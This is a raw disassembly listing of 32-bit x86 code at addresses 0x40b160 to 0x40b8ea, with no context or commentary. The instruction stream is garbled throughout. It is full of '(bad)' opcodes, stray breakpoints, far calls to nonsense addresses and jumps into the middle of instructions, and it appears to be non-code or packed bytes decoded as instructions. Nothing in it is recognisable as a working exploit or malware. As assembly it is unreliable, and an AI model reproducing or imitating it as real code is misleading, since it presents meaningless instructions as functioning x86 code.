  40b160:	add    ebx,DWORD PTR [esi+ebx*8+0x0]
  40b164:	push   DWORD PTR [ebp+0x700600cc]
  40b16a:	sub    edi,edi
  40b16c:	add    BYTE PTR [edi+0x14350000],bl
  40b172:	cmp    edi,0xffffff89
  40b175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b176:	inc    DWORD PTR [eax]
  40b178:	jmp    0x40b1ef
  40b17a:	jnp    0x40b17b
  40b17c:	add    BYTE PTR [ebx-0x1],ah
  40b17f:	dec    DWORD PTR [ecx]
  40b181:	cmp    esp,DWORD PTR [edi+0x0]
  40b184:	dec    DWORD PTR [eax+0x0]
  40b187:	int3   
  40b188:	pop    ebx
  40b189:	call   ebx
  40b18b:	inc    DWORD PTR [ebx-0x64ff0023]
  40b191:	adc    ecx,DWORD PTR [edi+edi*8-0x34]
  40b195:	in     al,dx
  40b196:	inc    DWORD PTR [ebx-0x5a7eb1]
  40b19c:	int3   
  40b19d:	pop    ds
  40b19e:	inc    DWORD PTR [eax]
  40b1a0:	fisubr WORD PTR [ebx]
  40b1a2:	les    eax,FWORD PTR [eax]
  40b1a4:	sbb    DWORD PTR [edi-0x1],0xffffffff
  40b1a8:	jecxz  0x40b205
  40b1aa:	inc    eax
  40b1ab:	(bad)  
  40b1ac:	inc    DWORD PTR [edx+0x5310ff00]
  40b1b2:	mov    ch,0x0
  40b1b4:	call   FWORD PTR ds:0x27c7ffff
  40b1ba:	ds add bh,bh
  40b1bd:	inc    esp
  40b1be:	dec    esp
  40b1c0:	mov    ebp,0xffffc52e
  40b1c5:	dec    BYTE PTR [ecx+0x71855f83]
  40b1cb:	int3   
  40b1cc:	cmp    DWORD PTR [esi-0x6a6e0001],0x9
  40b1d3:	add    ah,cl
  40b1d5:	push   ds
  40b1d6:	inc    DWORD PTR [eax]
  40b1d8:	leave  
  40b1d9:	inc    eax
  40b1da:	cmp    edi,0x0
  40b1dd:	push   eax
  40b1de:	add    ah,cl
  40b1e0:	enter  0xa396,0x89
  40b1e4:	add    dl,bl
  40b1e6:	add    BYTE PTR [eax],al
  40b1e8:	rcr    DWORD PTR [esi],1
  40b1ea:	(bad)  
  40b1eb:	inc    DWORD PTR [eax]
  40b1ed:	outs   dx,BYTE PTR ds:[esi]
  40b1ee:	add    bh,bh
  40b1f0:	cmp    BYTE PTR ds:0x6ff0062,0xff
  40b1f7:	inc    DWORD PTR [ebp+0x3a]
  40b1fa:	add    eax,0xffe7ccff
  40b1ff:	inc    DWORD PTR [edx]
  40b201:	lds    esp,FWORD PTR [ecx-0x1]
  40b204:	push   esi
  40b206:	cmp    edi,0x3c
  40b209:	cdq    
  40b20a:	repnz inc DWORD PTR [eax]
  40b20d:	and    DWORD PTR [eax],eax
  40b20f:	add    ah,cl
  40b211:	lods   eax,DWORD PTR ds:[esi]
  40b212:	sar    bh,0x89
  40b215:	add    WORD PTR [eax],0xff92
  40b219:	dec    esi
  40b21a:	aas    
  40b21b:	inc    DWORD PTR [eax]
  40b21d:	(bad)  
  40b21e:	(bad)  
  40b21f:	(bad)  
  40b220:	sti    
  40b221:	dec    esi
  40b222:	inc    esi
  40b223:	dec    esp
  40b225:	cmp    edi,0x1a9f7589
  40b22b:	add    BYTE PTR [eax],al
  40b22d:	test   eax,0xa1e30083
  40b232:	scas   eax,DWORD PTR es:[edi]
  40b233:	add    bh,bh
  40b235:	push   ss
  40b236:	add    bh,bh
  40b238:	ja     0x40b24b
  40b23a:	xchg   ebx,eax
  40b23b:	int3   
  40b23c:	and    DWORD PTR [eax],0xffffff89
  40b23f:	add    BYTE PTR [ebx-0x6f],ah
  40b242:	(bad)  
  40b243:	inc    DWORD PTR [eax]
  40b245:	repz add BYTE PTR [ebx-0xb7d9f5],al
  40b24c:	jmp    FWORD PTR [ebp+0x0]
  40b24f:	push   DWORD PTR [esi+0x3c]
  40b252:	ror    BYTE PTR [ecx-0xf801],0x5d
  40b259:	sub    cl,BYTE PTR [eax+0xeffcc]
  40b25f:	add    BYTE PTR [esi-0x12],bh
  40b262:	(bad)  
  40b263:	(bad)  
  40b264:	(bad)  
  40b265:	mov    edx,0x5734ff00
  40b26a:	or     cl,ah
  40b26c:	add    BYTE PTR [ebp+0x52b0089],ch
  40b272:	ror    BYTE PTR [ecx-0xfff901],cl
  40b278:	stc    
  40b279:	fs ret 
  40b27b:	mov    DWORD PTR [eax],eax
  40b27d:	enter  0xccff,0x6a
  40b281:	sbb    dl,al
  40b283:	(bad)  
  40b284:	(bad)  
  40b285:	out    dx,eax
  40b286:	int3   
  40b287:	add    BYTE PTR [ecx+0x4e],bh
  40b28a:	icebp  
  40b28b:	(bad)  
  40b28c:	inc    DWORD PTR [edi]
  40b28e:	add    bh,bh
  40b290:	pop    ss
  40b291:	cwde   
  40b292:	fild   DWORD PTR [eax]
  40b294:	int3   
  40b295:	push   0xffffffff
  40b297:	dec    DWORD PTR [ebp-0x76001b81]
  40b29d:	mov    ebx,0x9ecb8383
  40b2a2:	mov    edi,edi
  40b2a4:	or     ebx,0xffffffff
  40b2a7:	(bad)  
  40b2a8:	fcom   QWORD PTR [edx+0x389ff4c]
  40b2ae:	int3   
  40b2af:	jmp    DWORD PTR [edx]
  40b2b1:	adc    ecx,ebx
  40b2b3:	add    BYTE PTR [ecx-0x233ff98],cl
  40b2b9:	fs std 
  40b2bb:	or     DWORD PTR [ecx-0x4600ff7c],0xffffffe0
  40b2c2:	enter  0xff83,0x68
  40b2c6:	inc    DWORD PTR [eax]
  40b2c8:	mov    al,0x79
  40b2ca:	inc    DWORD PTR es:[eax]
  40b2cd:	out    dx,eax
  40b2ce:	int3   
  40b2cf:	inc    DWORD PTR [ecx]
  40b2d1:	push   edi
  40b2d2:	mov    bh,0x0
  40b2d4:	add    BYTE PTR [eax+0x1620cc00],dl
  40b2da:	jae    0x40b2db
  40b2dc:	and    DWORD PTR [ebx],0x0
  40b2df:	add    BYTE PTR [edx],dl
  40b2e1:	nop
  40b2e2:	xchg   ebx,eax
  40b2e3:	dec    esp
  40b2e5:	test   DWORD PTR [ecx-0x25645801],0xe6ffff
  40b2ef:	add    BYTE PTR ds:0xffffc95f,ah
  40b2f5:	push   esi
  40b2f6:	or     DWORD PTR [ecx-0x7c41d2a4],0xffffffff
  40b2fd:	and    eax,0xa24989ff
  40b302:	ret    
  40b303:	add    bh,bh
  40b305:	mov    bh,bh
  40b307:	call   esp
  40b309:	mov    ch,0x8c
  40b30b:	add    bh,bh
  40b30d:	mov    cl,0xcc
  40b30f:	dec    DWORD PTR [eax+0x33]
  40b312:	pushf  
  40b313:	add    bh,bh
  40b315:	cmc    
  40b316:	inc    DWORD PTR [eax]
  40b318:	rcl    DWORD PTR [esi+0x71],1
  40b31b:	(bad)  
  40b31c:	(bad)  
  40b31d:	fadd   QWORD PTR [ebx+0x3c98c0ff]
  40b323:	inc    DWORD PTR [ebx+0x5d89008f]
  40b329:	or     al,0x67
  40b32b:	(bad)  
  40b32c:	push   DWORD PTR [ecx+0x0]
  40b32f:	(bad)  
  40b330:	ficomp WORD PTR [edx]
  40b332:	je     0x40b334
  40b334:	inc    DWORD PTR [edi-0x7d]
  40b337:	jmp    DWORD PTR [eax+0x67]
  40b33a:	call   0x5e00:0xff7bffff
  40b341:	inc    esi
  40b342:	cld    
  40b343:	int3   
  40b344:	mov    DWORD PTR [edi-0x47b77601],ebp
  40b34a:	inc    edx
  40b34b:	inc    DWORD PTR [eax]
  40b34d:	les    ecx,FWORD PTR [ecx+0x112fc000]
  40b353:	add    BYTE PTR [eax],al
  40b355:	stos   BYTE PTR es:[edi],al
  40b356:	inc    DWORD PTR [eax]
  40b358:	fisttp QWORD PTR es:[ebp-0x1]
  40b35c:	or     DWORD PTR [ecx+0x46f2cc00],0x1a
  40b363:	(bad)  
  40b364:	push   DWORD PTR [eax-0x65c20001]
  40b36a:	int    0x89
  40b36c:	int3   
  40b36d:	out    dx,al
  40b36e:	(bad)  
  40b36f:	call   FWORD PTR [esi+0x89d7b8]
  40b375:	into   
  40b376:	add    DWORD PTR [eax],0x5e
  40b379:	inc    eax
  40b37a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b37b:	add    bh,bh
  40b37d:	xchg   ecx,eax
  40b37e:	(bad)  
  40b37f:	inc    DWORD PTR [ebx]
  40b381:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b382:	out    dx,al
  40b383:	add    bh,bh
  40b385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b386:	(bad)  
  40b387:	dec    DWORD PTR [edi-0x3d]
  40b38a:	and    al,0x83
  40b38c:	add    dh,dl
  40b38e:	int3   
  40b38f:	add    dl,dl
  40b391:	inc    eax
  40b392:	mov    esp,0xcc6affff
  40b397:	add    ch,dh
  40b399:	jns    0x40b3da
  40b39b:	add    BYTE PTR [eax],al
  40b39d:	scas   al,BYTE PTR es:[edi]
  40b39e:	add    BYTE PTR [ebx-0x33a83a12],al
  40b3a4:	int3   
  40b3a5:	mov    eax,0x57db0083
  40b3aa:	loope  0x40b3ac
  40b3ac:	(bad)  
  40b3ad:	jns    0x40b3ae
  40b3af:	sub    DWORD PTR [ecx],0xffffffad
  40b3b2:	push   ebp
  40b3b3:	(bad)  
  40b3b4:	dec    ecx
  40b3b6:	mov    DWORD PTR [ecx-0x7cb41cd1],ecx
  40b3bc:	(bad)  
  40b3bd:	cmp    al,0xff
  40b3bf:	inc    esi
  40b3c1:	sti    
  40b3c2:	pop    es
  40b3c3:	(bad)  
  40b3c4:	jmp    esp
  40b3c6:	dec    DWORD PTR [ecx-0x7c89979e]
  40b3cc:	cmp    DWORD PTR [ebp+0x1d25ffcc],0x2d
  40b3d3:	inc    DWORD PTR [ebx+0x3083ff4f]
  40b3d9:	out    dx,al
  40b3da:	icebp  
  40b3db:	add    BYTE PTR [ebx+0x35ffffad],al
  40b3e1:	pop    edx
  40b3e2:	or     al,0x0
  40b3e4:	(bad)  
  40b3e5:	clc    
  40b3e6:	inc    DWORD PTR [ebx-0x6494b7]
  40b3ec:	dec    eax
  40b3ee:	add    BYTE PTR [eax],al
  40b3f0:	inc    edx
  40b3f1:	add    edi,ebp
  40b3f3:	add    bh,bh
  40b3f5:	(bad)  
  40b3f6:	inc    DWORD PTR [eax]
  40b3f8:	xchg   DWORD PTR [eax+0x6983ffae],eax
  40b3fe:	(bad)  
  40b3ff:	push   DWORD PTR [edi]
  40b401:	pop    edx
  40b402:	mov    edx,0xff78ffff
  40b407:	jmp    DWORD PTR [eax+0xffb7be]
  40b40d:	and    bh,bh
  40b40f:	jmp    FWORD PTR [ebp-0x42]
  40b412:	add    ah,cl
  40b414:	(bad)  
  40b415:	clc    
  40b416:	(bad)  
  40b417:	jmp    FWORD PTR [ebx]
  40b419:	ja     0x38b41e
  40b41f:	cmp    DWORD PTR [edi],0xffffffcc
  40b422:	repnz (bad) 
  40b424:	inc    DWORD PTR [edx]
  40b426:	(bad)  
  40b427:	dec    DWORD PTR [esi+0xffdaa6]
  40b42d:	pusha  
  40b42e:	(bad)  
  40b42f:	push   DWORD PTR [ebp+0x1f]
  40b432:	inc    eax
  40b433:	(bad)  
  40b434:	(bad)  
  40b435:	fiadd  WORD PTR [eax]
  40b437:	sub    edi,0xfffffff4
  40b43a:	ret    0xffff
  40b43d:	adc    bh,bh
  40b43f:	call   FWORD PTR [ecx+ebp*2-0x6276002a]
  40b446:	cmp    edi,0x3b
  40b449:	leave  
  40b44a:	or     edi,edi
  40b44c:	add    BYTE PTR [eax],al
  40b44e:	add    BYTE PTR [eax],al
  40b450:	loope  0x40b3f7
  40b452:	add    BYTE PTR [eax],al
  40b454:	add    ah,dh
  40b456:	int3   
  40b457:	jmp    FWORD PTR [eax]
  40b459:	jle    0x40b44f
  40b45b:	add    BYTE PTR [eax],al
  40b45d:	je     0x40b45e
  40b45f:	add    BYTE PTR [ebp+0x2b],cl
  40b462:	rol    BYTE PTR [eax],1
  40b464:	jmp    esp
  40b466:	(bad)  
  40b467:	call   FWORD PTR [ecx+0x2f]
  40b46a:	sub    eax,0xe1ff00
  40b46f:	call   FWORD PTR [ecx-0x79]
  40b472:	mov    al,ds:0x110000
  40b477:	int3   
  40b478:	xor    eax,0x3e
  40b47b:	add    bh,bh
  40b47d:	je     0x40b47e
  40b47f:	add    ch,al
  40b481:	into   
  40b482:	(bad)  
  40b484:	xor    DWORD PTR [edi-0x1],0xffffffff
  40b488:	repz dec ebx
  40b48a:	mov    cl,0xff
  40b48c:	push   DWORD PTR [ecx+0x4d7effff]
  40b492:	or     eax,DWORD PTR [eax]
  40b494:	and    DWORD PTR [edx],0xffffffff
  40b497:	mov    DWORD PTR [eax],edi
  40b499:	xor    DWORD PTR [ebx+eax*4-0x7cc200],edx
  40b4a0:	adc    al,bh
  40b4a2:	(bad)  
  40b4a4:	sbb    DWORD PTR [edi+0x3ef9ffff],0xffffffe1
  40b4ab:	add    ah,cl
  40b4ad:	pop    eax
  40b4ae:	inc    DWORD PTR [eax]
  40b4b0:	sub    BYTE PTR [ebx+ebp*1-0x7c4fff34],0x83
  40b4b8:	mov    eax,0xff006a0d
  40b4bd:	xchg   ecx,eax
  40b4be:	(bad)  
  40b4bf:	dec    edx
  40b4c1:	push   cs
  40b4c2:	push   eax
  40b4c3:	dec    esp
  40b4c5:	mov    dh,0xff
  40b4c7:	(bad)  
  40b4c8:	mov    edx,0xff20a4
  40b4cd:	inc    esi
  40b4ce:	mov    DWORD PTR [ebx+0xa25f21],eax
  40b4d4:	call   FWORD PTR ds:0x57c7ffcc
  40b4da:	fisttp QWORD PTR [ecx-0x2d01]
  40b4e0:	adc    dl,bh
  40b4e2:	imul   eax,DWORD PTR [eax],0xff89f2ff
  40b4e8:	inc    ebp
  40b4e9:	in     al,dx
  40b4ea:	int3   
  40b4eb:	add    DWORD PTR [ebx+0x17ffff3e],0xffffffe9
  40b4f2:	je     0x40b477
  40b4f4:	add    cl,bh
  40b4f6:	inc    DWORD PTR [eax]
  40b4f8:	push   cs
  40b4f9:	mov    ebp,0xce00833b
  40b4fe:	add    ah,cl
  40b500:	aam    0xcf
  40b502:	sbb    eax,DWORD PTR [ebx-0x33004c34]
  40b508:	lahf   
  40b509:	fcmovbe st,st(2)
  40b50b:	add    BYTE PTR [eax],al
  40b50d:	push   ebx
  40b50e:	int3   
  40b50f:	push   DWORD PTR [ecx+ecx*8-0x3e7c7cf5]
  40b516:	int3   
  40b517:	(bad)  
  40b518:	mov    ebp,0xff1d10
  40b51d:	loope  0x40b4a8
  40b51f:	mov    DWORD PTR [ebx],eax
  40b521:	nop
  40b522:	and    edi,edi
  40b524:	add    ah,ch
  40b526:	int3   
  40b527:	mov    DWORD PTR [ebp+0xffc1d0],ebx
  40b52d:	lods   eax,DWORD PTR ds:[esi]
  40b52e:	add    bh,bh
  40b530:	arpl   WORD PTR [edx-0x24],si
  40b533:	dec    esp
  40b535:	rol    BYTE PTR [eax],0xff
  40b538:	xchg   ebp,eax
  40b539:	push   ecx
  40b53a:	inc    DWORD PTR cs:[eax]
  40b53d:	inc    ebp
  40b53e:	add    BYTE PTR [ebx-0x76b0ba65],al
  40b544:	sub    DWORD PTR [edx-0x1],0x0
  40b548:	cmc    
  40b549:	sub    edx,DWORD PTR [edi+edi*8-0x34]
  40b54d:	and    eax,DWORD PTR [eax]
  40b54f:	call   FWORD PTR [esi-0x7c004078]
  40b555:	enter  0xffff,0x80
  40b559:	call   0xffff:0xd1ff890c
  40b560:	lahf   
  40b561:	aas    
  40b562:	scas   al,BYTE PTR es:[edi]
  40b563:	add    BYTE PTR [eax],al
  40b565:	mov    ah,0xff
  40b567:	mov    eax,eax
  40b569:	aas    
  40b56a:	xchg   ebx,eax
  40b56b:	inc    DWORD PTR [eax]
  40b56d:	int3   
  40b56e:	(bad)  
  40b56f:	(bad)  
  40b570:	fdiv   DWORD PTR [ecx+0x3a]
  40b573:	add    BYTE PTR [eax],al
  40b575:	or     ecx,DWORD PTR [ecx+0x39b8adff]
  40b57b:	mov    DWORD PTR [eax],eax
  40b57d:	test   edi,edi
  40b57f:	int3   
  40b580:	and    al,0xa4
  40b582:	jl     0x40b583
  40b584:	add    BYTE PTR [edi-0x32b1ff01],dh
  40b58a:	sbb    edi,edi
  40b58c:	sub    DWORD PTR [eax+eax*1],0xffffffff
  40b590:	cdq    
  40b591:	push   cs
  40b592:	cdq    
  40b593:	dec    DWORD PTR [ecx+0x4dffff66]
  40b599:	adc    al,0xbf
  40b59b:	(bad)  
  40b59c:	(bad)  
  40b59d:	inc    DWORD PTR ds:[eax]
  40b5a0:	jo     0x40b55b
  40b5a2:	cmp    eax,DWORD PTR [eax]
  40b5a4:	add    BYTE PTR [edi],ah
  40b5a6:	cmp    edi,0xffffffa8
  40b5a9:	inc    esp
  40b5ab:	add    bh,bh
  40b5ad:	(bad)  
  40b5af:	and    DWORD PTR [edx-0x68],0x14
  40b5b3:	int3   
  40b5b4:	call   FWORD PTR [eax]
  40b5b6:	inc    DWORD PTR [ebx-0xd67563]
  40b5bc:	jmp    FWORD PTR [ecx]
  40b5be:	(bad)  
  40b5bf:	dec    DWORD PTR ds:0xffffadb3
  40b5c5:	mov    bh,0x0
  40b5c7:	inc    DWORD PTR [ebx]
  40b5c9:	ja     0x40b57c
  40b5cb:	add    bh,bh
  40b5cd:	jno    0x40b5cf
  40b5cf:	call   edx
  40b5d1:	(bad)  
  40b5d3:	add    BYTE PTR [eax],al
  40b5d5:	je     0x40b5d7
  40b5d7:	(bad)  
  40b5d8:	call   0x89413512
  40b5dd:	mov    ds:0xed2eff83,al
  40b5e2:	retf   0xffff
  40b5e5:	out    dx,al
  40b5e6:	add    bh,bh
  40b5e8:	cs inc ecx
  40b5eb:	(bad)  
  40b5ec:	dec    DWORD PTR [edx-0x317f007d]
  40b5f2:	stos   BYTE PTR es:[edi],al
  40b5f3:	add    BYTE PTR [eax],al
  40b5f5:	xchg   esi,eax
  40b5f6:	add    BYTE PTR [ebx+0xf19ab],al
  40b5fc:	sbb    DWORD PTR [ebx+0x3bf90083],0xffffffee
  40b603:	inc    DWORD PTR [eax]
  40b605:	pop    ds
  40b606:	inc    DWORD PTR [eax]
  40b608:	in     eax,dx
  40b609:	mov    ah,BYTE PTR [eax]
  40b60b:	inc    DWORD PTR [ebx+0x6c00ffc6]
  40b611:	and    al,0x67
  40b613:	int3   
  40b614:	add    ah,dl
  40b616:	(bad)  
  40b617:	inc    DWORD PTR [ebx+ebx*8+0x21]
  40b61b:	inc    DWORD PTR [ebx+0x68ff0001]
  40b621:	loop   0x40b62b
  40b623:	int3   
  40b624:	mov    DWORD PTR [ecx-0x7568ff01],edi
  40b62a:	inc    ebp
  40b62b:	add    bh,bh
  40b62d:	in     eax,dx
  40b62e:	dec    esp
  40b630:	mov    ebp,0x83833d0c
  40b635:	pop    ss
  40b636:	add    BYTE PTR [ebx-0x7c083f00],al
  40b63c:	dec    ebp
  40b63e:	cmp    edi,0xffffffa2
  40b641:	ins    BYTE PTR es:[edi],dx
  40b642:	ins    BYTE PTR es:[edi],dx
  40b643:	(bad)  
  40b644:	(bad)  
  40b645:	fld    DWORD PTR [eax]
  40b647:	add    BYTE PTR [edx+0x68a4],ch
  40b64d:	dec    ebp
  40b64e:	add    bh,bh
  40b650:	daa    
  40b651:	iret   
  40b652:	sbb    eax,0xcca6ffff
  40b657:	(bad)  
  40b658:	fisubr DWORD PTR [ebx-0x14]
  40b65b:	int3   
  40b65c:	xor    DWORD PTR [ebp-0x1],0xffffffff
  40b660:	sbb    DWORD PTR [ecx+0x3e],ebp
  40b663:	mov    DWORD PTR [eax],eax
  40b665:	dec    eax
  40b666:	dec    esp
  40b668:	or     ecx,ebp
  40b66a:	mov    bl,0xff
  40b66c:	add    BYTE PTR [edi],ch
  40b66e:	(bad)  
  40b66f:	inc    DWORD PTR [ebp+0xff5e27]
  40b675:	arpl   di,di
  40b677:	add    al,bh
  40b679:	fisttp WORD PTR [ecx]
  40b67b:	add    BYTE PTR [ecx+0x6683004b],cl
  40b681:	test   BYTE PTR [eax],ah
  40b683:	add    DWORD PTR [eax],0x3d
  40b686:	(bad)  
  40b687:	(bad)  
  40b688:	in     al,dx
  40b689:	push   es
  40b68a:	icebp  
  40b68b:	mov    esp,ecx
  40b68d:	rol    BYTE PTR [ebx-0x5916c07d],1
  40b693:	int3   
  40b694:	jmp    FWORD PTR [eax]
  40b696:	cmp    edi,0xffffffec
  40b699:	sbb    dh,bh
  40b69b:	add    BYTE PTR [ebx+0x20ccff3e],al
  40b6a1:	popa   
  40b6a2:	rol    DWORD PTR [eax],0xff
  40b6a5:	popa   
  40b6a6:	int3   
  40b6a7:	push   DWORD PTR [ebx-0x760032ab]
  40b6ad:	mov    al,ds:0x8b65ff83
  40b6b2:	lods   eax,DWORD PTR ds:[esi]
  40b6b3:	mov    DWORD PTR [eax],eax
  40b6b5:	add    BYTE PTR [eax],0xff
  40b6b8:	or     eax,0x83ff20f7
  40b6bd:	cmp    eax,DWORD PTR [ebx+0x19b9d483]
  40b6c3:	int3   
  40b6c4:	inc    ecx
  40b6c6:	dec    esp
  40b6c8:	sti    
  40b6c9:	shr    BYTE PTR [ebx],0xff
  40b6cc:	push   DWORD PTR [edx-0x6b340000]
  40b6d2:	dec    eax
  40b6d3:	add    BYTE PTR [eax],al
  40b6d5:	xchg   esi,eax
  40b6d6:	dec    DWORD PTR [ecx-0x33ee988e]
  40b6dc:	add    dl,bh
  40b6de:	add    DWORD PTR [ebx-0x7cafe67a],0x0
  40b6e5:	and    al,0xcc
  40b6e7:	mov    DWORD PTR ds:0xcc39e3,edi
  40b6ed:	add    BYTE PTR cs:[eax],al
  40b6f0:	cmp    al,0x21
  40b6f2:	pop    ss
  40b6f3:	mov    esp,ecx
  40b6f5:	enter  0x83ff,0x98
  40b6f9:	xlat   BYTE PTR ds:[ebx]
  40b6fa:	int3   
  40b6fb:	(bad)  
  40b6fc:	push   DWORD PTR [ebx]
  40b6fe:	inc    DWORD PTR [eax]
  40b700:	dec    edi
  40b701:	int    0x82
  40b703:	inc    DWORD PTR [eax]
  40b705:	jbe    0x40b706
  40b707:	add    BYTE PTR [edx+0xa911],dl
  40b70d:	jecxz  0x40b70f
  40b70f:	or     DWORD PTR [ecx-0x2e],0x37
  40b713:	cmp    edi,0xffffffb3
  40b716:	(bad)  
  40b717:	inc    DWORD PTR [edi+ebp*4]
  40b71a:	lods   al,BYTE PTR ds:[esi]
  40b71b:	add    BYTE PTR [eax],al
  40b71d:	js     0x40b71e
  40b71f:	(bad)  
  40b720:	in     al,dx
  40b721:	mov    al,0x6c
  40b723:	mov    DWORD PTR [ecx+0x66838324],ecx
  40b729:	mov    ebp,DWORD PTR [ecx-0x983301]
  40b72f:	(bad)  
  40b730:	js     0x40b777
  40b732:	bound  ecx,QWORD PTR [ecx-0x7cff4201]
  40b738:	stos   BYTE PTR es:[edi],al
  40b739:	mov    ds:0xfb83ff1e,eax
  40b73e:	add    BYTE PTR [eax],al
  40b740:	pop    esi
  40b741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b742:	pusha  
  40b743:	add    bh,bh
  40b745:	sar    bh,1
  40b747:	call   eax
  40b749:	loop   0x40b7ca
  40b74b:	(bad)  
  40b74c:	push   eax
  40b74e:	add    ah,cl
  40b750:	jmp    0x8a3fe689
  40b755:	loopne 0x40b757
  40b757:	int3   
  40b758:	dec    ecx
  40b759:	xchg   esp,eax
  40b75a:	outs   dx,DWORD PTR ds:[esi]
  40b75b:	(bad)  
  40b75c:	call   DWORD PTR [eax]
  40b75e:	inc    DWORD PTR [eax]
  40b760:	inc    ebp
  40b761:	loope  0x40b79b
  40b763:	inc    DWORD PTR [ebx-0x5e0000a9]
  40b769:	mov    al,0xc2
  40b76b:	add    BYTE PTR [ecx+0x62ff00b5],cl
  40b771:	push   ds
  40b772:	rol    BYTE PTR [eax],1
  40b774:	or     edx,0xffffffff
  40b777:	add    BYTE PTR [edx-0x76ab6e],ch
  40b77d:	cmp    BYTE PTR [ebx+0x15d52fff],al
  40b783:	add    ah,cl
  40b785:	mov    dh,0x0
  40b787:	call   FWORD PTR [ebx]
  40b789:	cmp    esi,DWORD PTR ds:0xff88ffff
  40b78f:	dec    DWORD PTR [ecx]
  40b791:	or     ch,ch
  40b793:	inc    DWORD PTR [eax]
  40b795:	retf   0xffcc
  40b798:	push   ebp
  40b799:	sbb    al,0xe2
  40b79b:	inc    DWORD PTR [ebx-0xc76002b]
  40b7a1:	std    
  40b7a2:	dec    WORD PTR [ecx+0x2183ffba]
  40b7a9:	fisubr WORD PTR [edi+0x74ff00]
  40b7af:	sub    DWORD PTR [esi],0xffffffb3
  40b7b2:	add    ah,cl
  40b7b4:	call   DWORD PTR [esp+ecx*8]
  40b7b7:	jmp    FWORD PTR [ebx+esi*8-0x670076f4]
  40b7be:	inc    DWORD PTR [eax]
  40b7c0:	lds    edx,FWORD PTR [esi+ecx*4-0x77]
  40b7c4:	call   DWORD PTR [esi]
  40b7c6:	add    bh,bh
  40b7c8:	xlat   BYTE PTR ds:[ebx]
  40b7c9:	pop    es
  40b7ca:	cmp    eax,0x89dfccff
  40b7cf:	jmp    FWORD PTR [edx]
  40b7d1:	(bad)  
  40b7d2:	dec    edi
  40b7d3:	cmp    edi,0xfffffffd
  40b7d6:	add    bh,bh
  40b7d8:	int3   
  40b7d9:	mov    edx,DWORD PTR [esp+ecx*8-0x34]
  40b7dd:	sar    bh,0x83
  40b7e0:	iret   
  40b7e1:	cld    
  40b7e2:	inc    edi
  40b7e3:	inc    DWORD PTR [eax]
  40b7e5:	daa    
  40b7e6:	add    BYTE PTR [ecx-0xa86c31],cl
  40b7ec:	add    BYTE PTR [ecx-0x7d],bl
  40b7ef:	cmp    DWORD PTR [ebx-0x33],0x3c
  40b7f3:	cmp    edi,0x1c
  40b7f6:	add    bh,bh
  40b7f8:	pushf  
  40b7f9:	and    al,0xdf
  40b7fb:	add    bh,bh
  40b7fd:	and    ah,cl
  40b7ff:	jmp    FWORD PTR [ebx]
  40b801:	dec    esp
  40b802:	xchg   ebx,eax
  40b803:	(bad)  
  40b804:	jmp    DWORD PTR [ebp-0x1]
  40b807:	or     DWORD PTR [ebp-0xff7988],0xffffffe0
  40b80e:	dec    esp
  40b810:	pop    ds
  40b811:	sbb    ch,BYTE PTR [edi-0x3ff34]
  40b817:	add    ah,ch
  40b819:	fwait
  40b81a:	sar    bh,0x0
  40b81d:	push   esp
  40b81e:	add    BYTE PTR [ebx-0x15f823],al
  40b824:	add    dl,ch
  40b826:	cmp    edi,0x51
  40b829:	outs   dx,BYTE PTR ds:[si]
  40b82b:	add    DWORD PTR [eax],0xffffffa5
  40b82e:	cmp    edi,0xffffff97
  40b831:	mov    ah,ah
  40b833:	add    bh,bh
  40b835:	adc    eax,DWORD PTR [eax]
  40b837:	push   DWORD PTR [eax-0x7c00ba37]
  40b83d:	add    edi,edi
  40b83f:	jmp    FWORD PTR [ebx]
  40b841:	stos   BYTE PTR es:[edi],al
  40b842:	inc    BYTE PTR [eax]
  40b844:	sbb    DWORD PTR [edi-0x64827d00],0xffffffde
  40b84b:	inc    DWORD PTR [ebx-0x7733fffb]
  40b851:	pop    DWORD PTR [edi-0x733301]
  40b857:	add    BYTE PTR [edi],cl
  40b859:	enter  0x89c6,0xff
  40b85d:	arpl   WORD PTR [ebx-0x590e5634],ax
  40b863:	add    DWORD PTR [eax],0x7e
  40b866:	int3   
  40b867:	dec    DWORD PTR [ebx+0x38]
  40b86a:	push   esp
  40b86b:	add    BYTE PTR [ecx+0x22898965],cl
  40b871:	ins    BYTE PTR es:[edi],dx
  40b872:	popa   
  40b873:	dec    esp
  40b875:	sub    eax,0xd19eff83
  40b87a:	sub    al,0x0
  40b87c:	add    ch,cl
  40b87e:	(bad)  
  40b87f:	push   ebp
  40b881:	stos   BYTE PTR es:[edi],al
  40b882:	fld    QWORD PTR [ebx-0x7c004801]
  40b888:	and    eax,0xff009aea
  40b88d:	les    eax,FWORD PTR [ebx+0xdb5acff]
  40b893:	dec    esp
  40b895:	pop    ebx
  40b896:	(bad)  
  40b897:	call   DWORD PTR [eax]
  40b899:	rcl    DWORD PTR [esi+0x0],cl
  40b89c:	call   DWORD PTR [ecx-0x1]
  40b89f:	push   DWORD PTR [ecx+0x5d51]
  40b8a5:	dec    ecx
  40b8a6:	mov    edi,edi
  40b8a8:	cli    
  40b8a9:	jge    0x40b84d
  40b8ab:	add    bh,bh
  40b8ad:	mov    esp,0x21eaff83
  40b8b2:	xor    DWORD PTR [eax],eax
  40b8b4:	dec    DWORD PTR [ebx+0x0]
  40b8b7:	jmp    DWORD PTR [esi+eiz*1-0x35]
  40b8bb:	(bad)  
  40b8bc:	dec    DWORD PTR [eax-0x1]
  40b8bf:	dec    edi
  40b8c1:	(bad)  
  40b8c2:	lods   eax,DWORD PTR ds:[esi]
  40b8c3:	(bad)  
  40b8c4:	push   DWORD PTR [edi]
  40b8c6:	(bad)  
  40b8c7:	jmp    FWORD PTR [eax+0x5a]
  40b8ca:	inc    ebx
  40b8cb:	(bad)  
  40b8cc:	call   DWORD PTR [ecx-0x7d]
  40b8cf:	int3   
  40b8d0:	stos   DWORD PTR es:[edi],eax
  40b8d1:	retf   0xff5c
  40b8d4:	add    cl,ah
  40b8d6:	(bad)  
  40b8d7:	jmp    DWORD PTR [ebp-0xb38]
  40b8dd:	cmp    al,0x83
  40b8df:	jmp    edx
  40b8e1:	xor    al,0x5e
  40b8e3:	(bad)  
  40b8e4:	push   DWORD PTR [ecx]
  40b8e6:	inc    DWORD PTR [eax]
  40b8e8:	mov    BYTE PTR [eax],bh
  40b8ea:	bound  eax,QWORD PTR [eax]
